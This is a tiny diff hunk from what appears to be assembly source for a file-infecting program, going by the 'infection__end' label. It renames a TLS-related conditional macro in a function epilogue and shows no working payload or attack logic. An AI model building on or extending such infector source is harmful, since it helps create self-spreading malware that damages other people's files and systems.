@@ -178,7 +178,7 @@ infection__end:
    add esp,0x68
    pop ebp
 
-%ifdef TLS
+%ifdef INFECTION_TLS
    ret 0xC
 %else
    ret
